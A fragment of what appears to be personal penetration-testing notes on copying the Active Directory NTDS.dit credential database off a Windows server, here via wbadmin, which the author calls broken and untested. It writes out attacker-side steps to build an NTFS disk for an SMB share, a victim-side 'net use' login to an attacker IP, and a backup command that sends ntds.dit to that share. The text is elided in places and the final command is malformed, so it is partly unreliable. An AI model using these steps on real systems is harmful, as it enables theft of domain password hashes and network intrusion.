...
---
## Copying C:\ with diskshadow To Retrieve NTDS.dit
...
### Copying NTDS.dit  with wbadmin (Broken, UnTested) dont recommend it.
i wanted to try ippsec's technique from 5 years ago but it appears to be extremely buggy
#### on Attacker:
2. create NTFS folder on server so wbadmin doesnt fail

#attacker:

dd if=/dev/zero of=ntfs.disk bs=1024M count=2
sudo losetup -fP ntfs.disk
#verify mount point for ntfs.disk
losetup -a
mkfs.ntfs /dev/loop0
...
modify the smb service on linux 

2. Authenticate to smb server 

# on victim:
net use \\10.10.16.52\share /user:vipa0z `Password!23`

2. start backup on target using wbadmin

echo y | start backup -backuptarget:\\10.10.14.2\share -include:c:\windows\ntds.dit
```
